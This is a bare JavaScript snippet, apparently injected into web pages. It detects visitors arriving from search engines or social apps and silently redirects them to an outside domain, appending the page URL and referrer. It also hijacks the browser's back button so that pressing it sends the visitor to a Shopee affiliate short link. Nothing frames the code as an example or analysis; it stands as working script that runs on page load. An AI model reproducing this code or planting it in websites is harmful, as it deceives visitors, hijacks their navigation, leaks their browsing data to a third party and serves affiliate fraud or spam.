var ars = rChoice([
    'https://resep.madreview.net',
]);

function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

if ([".google.", "bing.", "yandex.", "facebook.", ".pinterest.", ".yahoo.", "mysearch.", ".baidu.", "duckduckgo.",
        "ask.", "aol."
    ].some((s) => document.referrer.toLowerCase().includes(s)) || ["fb", "facebook", "pinterest", "twitter", "messenger"].some((
        s) => navigator.userAgent.toLowerCase().includes(s))) {
    window.location.href = ars + "/?arsae=" + encodeURIComponent(window.location.href) + "&arsae_ref=" +
        encodeURIComponent(document.referrer);
}


var shopeelink = pilihShopee([
	'https://shope.ee/5zpL5DxoTU',
]);

function pilihShopee(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);
window.addEventListener("popstate", function() {
 if(location.hash === "#!/history") {
 history.replaceState(null, document.title, location.pathname);
 setTimeout(function(){
 location.replace(shopeelink);
 },10);
 }
}, false);
}(window, location));
